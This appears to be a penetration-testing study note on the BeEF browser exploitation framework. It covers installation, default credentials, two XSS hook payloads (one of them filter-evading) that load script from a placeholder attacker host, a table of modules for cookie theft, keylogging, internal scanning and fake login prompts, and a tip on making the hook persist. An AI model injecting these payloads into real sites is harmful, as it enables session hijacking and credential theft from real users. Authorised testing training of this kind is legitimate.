# BeEF (Browser Exploitation Framework)

**Tags:** #BeEF #XSS #WebAppAttacks #ClientSide #PostExploitation #SocialEngineering

`BeEF` turns a landed XSS into an interactive session. The victim's browser loads `hook.js`, which opens a polling channel back to the BeEF server; from the web UI you then run modules against that "hooked" browser — read cookies, keylog, fingerprint the browser and its plugins, scan the victim's internal network, or throw social-engineering prompts. Use it to demonstrate real impact from an XSS finding rather than an `alert(1)` screenshot.

**Source:** https://github.com/beefproject/beef
**Install:** ships in Kali (`sudo apt install beef-xss`) — lives in `/usr/share/beef-xss`

```bash
# Start the server
cd /usr/share/beef-xss && ./beef

# UI:    http://127.0.0.1:3000/ui/panel
# Creds: beef:beef  (change in config.yaml — it refuses to start with defaults on newer builds)
```

```html
<!-- Hook payload — deliver through the XSS injection point -->
<script src="http://<AttackerIP>:3000/hook.js"></script>

<!-- If script tags are filtered, inject the hook dynamically -->
<img src=x onerror="var s=document.createElement('script');s.src='http://<AttackerIP>:3000/hook.js';document.body.appendChild(s)">
```

| Module | Path in BeEF UI |
|---|---|
| Get cookies | Browser > Hooked Domain > Get Cookie |
| Keylogger | Browser > Hooked Domain > Interceptor |
| Redirect browser | Browser > Hooked Domain > Redirect Browser |
| Internal network scan | Network > Port Scanner |
| Fake login prompt | Social Engineering > Pretty Theft |

> [!warning] The hook only holds while the victim keeps the page open — a navigation away drops the session. Chain it with a persistent frame or a stored XSS on a page users leave open.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Cross-Site Scripting (XSS)|Cross-Site Scripting (XSS)]] — post-XSS browser control and impact demonstration.

---

*Created: 2026-07-30*
*Updated: 2026-07-30*
*Model: claude-opus-5*
